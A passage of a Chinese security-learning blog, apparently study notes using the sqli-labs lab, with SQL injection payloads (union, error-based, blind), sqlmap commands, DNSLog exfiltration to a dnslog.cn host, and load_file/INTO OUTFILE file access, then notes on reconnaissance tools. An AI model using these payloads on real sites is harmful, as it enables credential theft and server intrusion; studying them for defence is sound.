class="code"><pre><code class="hljs text">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+<br>指定数据库中指定表中所有字段名<br>?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+<br></code></pre></td></tr></table></figure><p>具体数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=-1&#x27; union select 1,2,group_concat(username,password) from users --+<br></code></pre></td></tr></table></figure><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>前提：页面会显示数据库报错信息。<br>得到报错信息、获取所有数据库名、获取指定数据库所有表名、获取指定数据库指定表中所有字段名、获取具体数据。<br>数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) --+<br></code></pre></td></tr></table></figure><p>或所有数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata),0x7e),1) --+<br></code></pre></td></tr></table></figure><p>由于无法像联合查询一样一次性看到所有数据库名称，就需要使用limit参数逐个查询</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+<br></code></pre></td></tr></table></figure><p>指定数据库中表名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat(((select concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+<br>指定数据库中指定表中所有字段名<br>?id=1&#x27; and (select 1 from (select count(*),concat((select concat(column_name,&#x27;;&#x27;) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) --+<br></code></pre></td></tr></table></figure><p>具体数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#x27;Dumb&#x27;,&#x27;Angelina&#x27;))))--+<br></code></pre></td></tr></table></figure><p>或使用limit挨个遍历</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x3a,password) as char),0x7e)) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+<br></code></pre></td></tr></table></figure><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>情况：没有显示位、没有报错信息，但是有SQL语句执行错误信息输出的场景，仅仅通过报错这一行为去判断SQL注入语句是否执行成功。<br>数据库长度</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (length(database()))&gt;7 --+<br>?id=1&#x27; and (length(database()))&gt;8 --+<br></code></pre></td></tr></table></figure><p>数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">1 and ascii(substr(database(),1,1))&gt;110<br>1 and ascii(substr(database(),2,1))&gt;110<br></code></pre></td></tr></table></figure><p>指定数据库中表名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs text">第一张表<br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 0,1),1,1))&gt;110<br>(不断改变范围，把第一张数据表的第一个字母猜解出来)<br><br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 0,1),2,1))&gt;110<br>(不断改变范围，把第一张数据表的第二个字母猜解出来)<br><br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 0,1),3,1))&gt;110<br>(不断改变范围，把第一张数据表的第三个字母猜解出来)<br><br>......<br>......<br>最后得到表名为news<br><br>第二张表<br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 1,1),1,1))&gt;110<br>(不断改变范围，把第二张数据表的第一个字母猜解出来)<br><br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 1,1),2,1))&gt;110<br>(不断改变范围，把第二张数据表的第二个字母猜解出来)<br><br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 1,1),3,1))&gt;110<br>(不断改变范围，把第二张数据表的第三个字母猜解出来)<br><br>......<br>......<br>最后得到表名为flag<br><br></code></pre></td></tr></table></figure><p>指定数据库中指定表中所有字段名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">表的字段数<br>1 and (select count(column_name) from information_schema.columns<br> where table_name=&#x27;flag&#x27;)=1<br><br>得到flag只有一个字段<br><br>字段名称<br>1 and ascii(substr((select column_name from information_schema.columns<br> where table_name=&#x27;flag&#x27;),1,1))&gt;110<br>(不断改变范围，把字段名猜解出来)<br><br>......<br>得到字段名也为flag<br><br></code></pre></td></tr></table></figure><p>具体数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">1 and ascii(substr((select * from sqli.flag where id=1),1,1))&gt;110<br>1 and ascii(substr((select * from sqli.flag where id=1),2,1))&gt;110<br>1 and ascii(substr((select * from sqli.flag where id=1),3,1))&gt;110<br><br>......<br>这是一个巨大的工作量，所以应该积累到的一个经验是：<br>手工盲注特别繁琐，碰到这类题目要会用工具sqlmap<br><br></code></pre></td></tr></table></figure><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>前提：页面上没有显示位，也没有输出SQL语句执行错误信息。 正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，页面的返回速度明显慢了5秒。<br>缺点：因为是通过sleep()函数影响的响应时间来判断语句是否执行，所以比布尔盲注更慢，真实环境下时间盲注一个注入点需要跑大概五六个小时。<br>猜解数据库<br>数据库个数</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1 and if((select count(schema_name) from information_schema.schemata)=9,sleep(5),1)<br></code></pre></td></tr></table></figure><p>第一个数据库名有多少个字符</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1 and if((select length(schema_name) from information_schema.schemata limit0,1)=18,sleep(5),1)<br></code></pre></td></tr></table></figure><p>判断第一个库第一个字符</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1 and if((select ascii(substr((select schema_name from information_schema.schemata limit0,1),1,1)))=105,sleep(5),1)<br>?id=1 and if((select ascii(substr((select schema_name from information_schema.schemata limit0,1),2,1)))=110,sleep(5),1)//判断第一个库第二个字符<br></code></pre></td></tr></table></figure><p>当前数据库<br>当前数据库长度</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27;+and+if((length(database()))=7,sleep(5),1) --+<br>?id=1&#x27;+and+if((length(database()))=8,sleep(5),1) --+<br></code></pre></td></tr></table></figure><p>当前数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+<br></code></pre></td></tr></table></figure><p>猜解表名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=108,sleep(5),1) --+<br></code></pre></td></tr></table></figure><p>URL编码后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1%27%20and%20if((ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20t<br>able_schema=database()%20limit%200,1),1,1)))=108,sleep(5),1)%20--+<br></code></pre></td></tr></table></figure><p>猜解字段名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;表名&#x27; limit 1,1),1,1)))=102,sleep(5),1) --+<br></code></pre></td></tr></table></figure><p>URL编码后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1%27%20and%20if((ascii(substr((select%20column_name%20from%20information_schema.columns%20<br>where%20table_name=%27users%27%20limit%201,1),1,1)))=102,sleep(5),1)%20--+<br></code></pre></td></tr></table></figure><p>猜解具体数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and if((ascii(substr((select 字段名 from 表名 limit 0,1),1,1)))=102,sleep(5),1) --+<br></code></pre></td></tr></table></figure><p>URL编码后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1%27%20and%20if((ascii(substr((select%20password%20from%20users%20limit%200,1),1,1)))=102,<br>sleep(5),1)%20--+<br></code></pre></td></tr></table></figure><h3 id="8）实用工具注入"><a href="#8）实用工具注入" class="headerlink" title="8）实用工具注入"></a>8）实用工具注入</h3><h5 id="1-sqlmap"><a href="#1-sqlmap" class="headerlink" title="1.sqlmap"></a>1.sqlmap</h5><p>基础探测命令<br>联合查询注入：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">.\sqlmap.py -u &quot;http://192.168.xxx.xxx/sqli/Less-1/?id=1&quot; --dbms=MySQL --technique=U -v 3<br></code></pre></td></tr></table></figure><p>报错注入：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">.\sqlmap.py -u &quot;http://192.168.xxx.xxx/sqli/Less-1/?id=1&quot; --dbms=MySQL --technique=E -v 3<br></code></pre></td></tr></table></figure><p>布尔盲注：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">.\sqlmap.py -u &quot;http://192.168.xxx.xxx/sqli/Less-1/?id=1&quot; --dbms=MySQL --technique=B -v 3<br></code></pre></td></tr></table></figure><p>时间盲注：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">.\sqlmap.py -u &quot;http://192.168.xxx.xxx/sqli/Less-1/?id=1&quot; --dbms=MySQL --technique=T -v 3<br></code></pre></td></tr></table></figure><p>爆破数据<br>–current-db 当前使用的数据库<br>–dbs 列出数据库信息<br>-D 指定数据库，爆破指定数据库中的表<br>-D 数据库名 –tables<br>-T 指定数据表名，爆破指定表中的字段<br>-D 库名 -T 表名 –columns<br>-C 指定字段名，爆破具体数据<br>–dump 将数据导出、转储<br>指定库、表、字段，查询具体数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">.\sqlmap.py -u &quot;http://192.168.xxx.xxx/sqli/Less-1/?id=1&quot; --dbms=MySQL --technique=T -v 3 -D security<br></code></pre></td></tr></table></figure><h2 id="DNSLog注入"><a href="#DNSLog注入" class="headerlink" title="DNSLog注入"></a>DNSLog注入</h2><p>流程图：</p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231012082218590.png" alt="image-20231012082218590" style="zoom:80%;" /><h4 id="CEYE平台"><a href="#CEYE平台" class="headerlink" title="CEYE平台"></a>CEYE平台</h4><p><a href="http://ceye.io/profile">http://ceye.io/profile</a></p><h4 id="UNC（Windows）"><a href="#UNC（Windows）" class="headerlink" title="UNC（Windows）"></a>UNC（Windows）</h4><p>Universal Naming Convention 通用命名规则</p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231012083952258.png" alt="image-20231012083952258" style="zoom:80%;" /><h4 id="DNSLog注入流程："><a href="#DNSLog注入流程：" class="headerlink" title="DNSLog注入流程："></a>DNSLog注入流程：</h4><p>1、把select LOAD_FILE()注入到数据库，访问文<br>件<br>2、UNC构建DNS服务器地址，假装访问文件，产生DNSLog</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">select load<span class="hljs-constructor">_file(&#x27;<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">aaa</span>.<span class="hljs-params">yourid</span>.<span class="hljs-params">dnslog</span>.<span class="hljs-params">cn</span><span class="hljs-operator">/</span><span class="hljs-params">wuya</span>&#x27;)</span>;<br></code></pre></td></tr></table></figure><p>3、把子域名替换成函数或者查询SQL</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">select if((<span class="hljs-name">select</span> load_file(<span class="hljs-name">concat</span>(&#x27;////&#x27;,database(),&#x27;.yourid.dnslog.cn/wuya&#x27;))),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h4 id="DNSLog注入脚本"><a href="#DNSLog注入脚本" class="headerlink" title="DNSLog注入脚本"></a>DNSLog注入脚本</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">python <span class="hljs-number">2</span><br>dnslogSql.py -u http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/sqli-labs/</span>Less-<span class="hljs-number">9</span>/?id=<span class="hljs-number">1</span> -c<br>dnslogSql.py -u <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+&quot;</span> --dbs<br></code></pre></td></tr></table></figure><h2 id="SQL高权限注入"><a href="#SQL高权限注入" class="headerlink" title="SQL高权限注入"></a>SQL高权限注入</h2><p>MySQL 权限介绍</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">and</span> host=<span class="hljs-string">&#x27;localhost&#x27;</span>\G;<br><br>mysql权限表的验证过程为：<br><br>先从<span class="hljs-keyword">user</span>表中的Host,<span class="hljs-keyword">User</span>,<span class="hljs-keyword">Password</span>这<span class="hljs-number">3</span>个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。<br><br>通过身份认证后，进行权限分配，<br>按照<span class="hljs-keyword">user</span>，db，tables_priv，columns_priv的顺序进行验证。<br>即先检查全局权限表<span class="hljs-keyword">user</span>，如果<span class="hljs-keyword">user</span>中对应的权限为Y，则此用户对所有数据库的权限都为Y，<br>将不再检查db, tables_priv,columns_priv；如果为N，则到db表中检查此用户对应的具体数据库，<br>并得到db中为Y的权限；如果db中为N，则检查tables_priv中此数据库对应的具体表，取得表中的权限Y，以此类推。<br> <br> <span class="hljs-number">2.1</span> 系统权限表<br><span class="hljs-keyword">User</span>表：存放用户账户信息以及全局级别（所有数据库）权限，决定了来自哪些主机的哪些用户可以访问数据库实例，如果有全局权限则意味着对所有数据库都有此权限 <br>Db表：存放数据库级别的权限，决定了来自哪些主机的哪些用户可以访问此数据库 <br>Tables_priv表：存放表级别的权限，决定了来自哪些主机的哪些用户可以访问数据库的这个表 <br>Columns_priv表：存放列级别的权限，决定了来自哪些主机的哪些用户可以访问数据库表的这个字段 <br>Procs_priv表：存放存储过程和函数级别的权限<br><br><br> <span class="hljs-number">2.</span> MySQL 权限级别分为： <br>全局性的管理权限： 作用于整个MySQL实例级别 <br>数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上 <br>数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象<br> <br> <span class="hljs-number">3.</span>查看mysql 有哪些用户：<br>mysql&gt; <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span>;<br> <br> <span class="hljs-number">4.</span>查看用户对应权限<br> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">and</span> host=<span class="hljs-string">&#x27;localhost&#x27;</span>\G;  #所有权限都是Y ，就是什么权限都有<br> <br> <span class="hljs-number">5.</span>创建 mysql 用户<br>有两种方式创建MySQL授权用户<br><br>执行<span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span>/<span class="hljs-keyword">grant</span>命令（推荐方式）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;finley&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;some_pass&#x27;</span>;<br>通过<span class="hljs-keyword">insert</span>语句直接操作MySQL系统权限表<br> <br> <span class="hljs-number">6.</span>只提供id查询权限<br> <span class="hljs-keyword">grant</span> <span class="hljs-keyword">select</span>(id) <span class="hljs-keyword">on</span> test.<span class="hljs-keyword">temp</span> <span class="hljs-keyword">to</span> test1@<span class="hljs-string">&#x27;localhost&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br> <br> <span class="hljs-number">7.</span>把普通用户变成管理员<br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;test1&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>;<br><br> <span class="hljs-number">8.</span>删除用户<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">user</span> finley@<span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="SQL注入文件读写"><a href="#SQL注入文件读写" class="headerlink" title="SQL注入文件读写"></a>SQL注入文件读写</h2><p>文件读写注入的条件</p><p>高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限</p><p><strong>secure_file_priv选项</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">linux<br><span class="hljs-built_in">cat</span>  etc/conf<br><br>win<br>www/mysql / my.ini<br></code></pre></td></tr></table></figure><p>show global variables like ‘%secure%’  查看mysql全局变量的配置</p><p>1、读写文件需要 <code>secure_file_priv</code>权限</p><p><strong><code>secure_file_priv=</code></strong></p><p>代表对文件读写没有限制</p><p><code>secure_file_priv=NULL</code></p><p>代表不能进行文件读写</p><p><code>secure_file_priv=d:/phpstudy/mysql/data</code></p><p>代表只能对该路径下文件进行读写</p><p>2、知道网站绝对路径</p><p>Windows常见：</p><p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/52b8185c15804b098e5832e56952f9d5.png" alt="image.png"></p><p>Linux常见：</p><p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/c22c368cda784e5ebb911ff0bbd0fa99.png" alt="image.png"></p><p>路径获取常见方式：</p><p>报错显示，遗留文件，漏洞报错，平台配置文件等</p><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>使用函数：<code>load_file()</code></p><p>后面的路径可以是单引号，0x，char转换的字符。</p><p>注意：路径中斜杠是&#x2F;不是\。</p><p>一般可以与union中做为一个字段使用，查看config.php(即mysql的密码)，apache配置…</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">LOAD_FILE</span>(<span class="hljs-params"><span class="hljs-string">&#x27;E:\\in.txt&#x27;</span></span>)</span>;<br></code></pre></td></tr></table></figure><p>1、只能访问本机的文件</p><p>2、文件需要有读取权限</p><p>3、字节数小于max_allowed_packet</p><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><p>使用函数：<code>Into Outfile</code>（能写入多行，按格式输出）和 <code>into Dumpfile</code>（只能写入一行且没有输出格式）</p><p>outfile 后面不能接0x开头或者char转换以后的路径，只能是单引号路径</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">select</span> <span class="hljs-number">123</span> INTO OUTFILE <span class="hljs-symbol">&#x27;E</span>:\\<span class="hljs-keyword">out</span>.txt&#x27;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2023/10/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/"/>
    <url>/2023/10/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试流程？"><a href="#渗透测试流程？" class="headerlink" title="渗透测试流程？"></a>渗透测试流程？</h1><hr><ul><li>确定目标</li><li>信息收集</li><li>漏洞扫描</li><li>漏洞利用</li><li>形成报告</li></ul><h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><h2 id="包括内容"><a href="#包括内容" class="headerlink" title="包括内容"></a>包括内容</h2><h3 id="1-域名相关的信息"><a href="#1-域名相关的信息" class="headerlink" title="1. 域名相关的信息"></a>1. 域名相关的信息</h3><h4 id="域名是什么。"><a href="#域名是什么。" class="headerlink" title="域名是什么。"></a>域名是什么。</h4><pre><code class="hljs">&gt;1.互联网上某个网页或Web应用程序的名称&gt;&gt;2.它由一串用点分隔的字符组成的，用于在数据传输时标识计算机的电子方位或地理位置。&gt;&gt;3.域名的目的是为网站提供一个简单，可识别的名称，方便用户和浏览器访问。&gt;&gt;4.如果没有域名，网站将通过其IP地址来识别，这些IP地址显示为一串数字，不易记忆。域名可分为：1.国际域名    .com(商业公司);.net(网络服务);.org(组织协会等);.gov(政府部    门);.edu(教育机构);.mil(军事领域);.int(国际组织)2.国别域名        .CN代表中国，.UK代表英国，.US代表美国3.新顶级域名    biz, info，name，pro，aero, coop, museum…</code></pre><h4 id="域名与IP："><a href="#域名与IP：" class="headerlink" title="域名与IP："></a>域名与IP：</h4><pre><code class="hljs">&gt;域名和IP地址都是为网址提供访问入口的，只是访问的形式不一样1。 域名是作为代替IP地址的形式而存在的，因为IP地址在上网的过程中比较麻烦，并且不容易记录1。 域名可以对应多个IP地址，但是一个IP地址只是对应于一个域名2。 查询域名的IP地址可以通过DNS服务器或者命令提示符的nslookup命令34。 域名最终是解析到IP上的，域名与IP在内网访问还是外网访问，看IP是内网IP还是公网IP&gt;通过域名解析----&gt;得到IP地址</code></pre><h4 id="域名联系人信息"><a href="#域名联系人信息" class="headerlink" title="域名联系人信息"></a>域名联系人信息</h4><pre><code class="hljs">&gt;所属人、邮箱、电话、地址......</code></pre><h4 id="whois"><a href="#whois" class="headerlink" title="whois:"></a>whois:</h4><pre><code class="hljs">&gt;    工具：        1)Kali----whois        2)在线查询：             https://whois.chinaz.com            https://whois.aizhan.com/            https://whois.aliyun.com/</code></pre><h4 id="域名反查："><a href="#域名反查：" class="headerlink" title="域名反查："></a>域名反查：</h4><pre><code class="hljs">http://whois.chinaz.com/reverse</code></pre><h4 id="IP，域名查询："><a href="#IP，域名查询：" class="headerlink" title="IP，域名查询："></a>IP，域名查询：</h4><pre><code class="hljs">https://site.ip138.com/</code></pre><h4 id="ICP备案查询"><a href="#ICP备案查询" class="headerlink" title="ICP备案查询"></a>ICP备案查询</h4><pre><code class="hljs">作用:        必须在工信部的系统中备案，才能够通过域名访问工具：        https://icp.chinaz.com/(首选)        https://beian.miit.gov.cn/#/Integrated/index        https://www.beian88.com/</code></pre><h4 id="企业信息查询"><a href="#企业信息查询" class="headerlink" title="企业信息查询"></a>企业信息查询</h4><pre><code class="hljs">天眼查，企查查</code></pre><h4 id="子域名收集："><a href="#子域名收集：" class="headerlink" title="子域名收集："></a>子域名收集：</h4><pre><code class="hljs">子域名是主域名的下一级域名，通常是大型公司为了满足不同产品或业务需求在主域名基础上发展而来。 子域名一般会根据不同用途在主域名前面加上不同的前缀构成。 子域名根据主域名前面的前缀数量，又可分为二级子域名、三级子域名和多级的子域名</code></pre><h4 id="子域名收集方法："><a href="#子域名收集方法：" class="headerlink" title="子域名收集方法："></a>子域名收集方法：</h4><pre><code class="hljs">字典猜解，域名枚举工具：    子域名挖掘机：layer    功能强大的子域名收集：OneForAll    用小字典递归地发现域名：subDomainsBrute</code></pre><h4 id="域名DNS信息"><a href="#域名DNS信息" class="headerlink" title="域名DNS信息"></a>域名DNS信息</h4><pre><code class="hljs">简介：DNS是域名解析协议DNS 是域名系统 (Domain Name System) 的缩写，是因特网的一项核心服务，它作为可以将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。这也是DNS的官方说法。说白了就是：在互联网中通过IP 地址来进行通信。但是IP 地址的表示形式是数字，很难进行记忆（比如116.213.120.232），所以为每个 IP取一个人类更易记忆的域名形式（比如www.google.com），而通过DNS 来把解析域名成为 IP（将方便人理解的命名格式解析成计算机能够理解的格式，也可以将IP 翻译成域名）DNS记录类型</code></pre><p>​<br>​域名解析工具：<br>​kali:<br>​host url<br>​dig url</p><h3 